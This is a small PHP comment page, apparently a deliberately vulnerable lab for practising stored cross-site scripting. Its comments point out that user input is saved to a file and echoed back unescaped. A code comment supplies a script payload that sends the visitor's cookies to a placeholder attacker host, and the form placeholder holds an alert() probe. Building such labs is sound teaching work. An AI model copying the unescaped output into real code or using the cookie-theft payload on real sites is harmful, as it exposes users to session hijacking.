<?php
// VULNERABILITY #1: Stored XSS via file write (no sanitization)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $comment = $_POST['comment']; // Raw user input, no filtering

    // VULNERABILITY #2: Writing unsanitized user input to file
    // Try: <script>document.location='http://attacker.com?c='+document.cookie</script>
    $file = fopen("comments.txt", "a");
    fwrite($file, $comment . "\n");
    fclose($file);

    echo "<p style='color:green;'>Comment saved!</p>";
}

// VULNERABILITY #3: Reading and displaying raw stored content (Stored XSS)
$comments = file_exists("comments.txt") ? file_get_contents("comments.txt") : "";
?>
<!DOCTYPE html>
<html>
<head><title>Comments</title></head>
<body>
<h2>Leave a Comment</h2>
<form method="POST">
    <textarea name="comment" rows="4" cols="50" placeholder="Try: <script>alert('Stored XSS')</script>"></textarea><br>
    <button type="submit">Post Comment</button>
</form>

<h3>Comments:</h3>
<!-- VULNERABILITY: Raw HTML output of stored comments = Stored XSS -->
<div style="border:1px solid #ccc; padding:10px;">
    <?php echo $comments; // No htmlspecialchars() = XSS ?>
</div>

<a href="index.php">Back to Login</a>
</body>
</html>
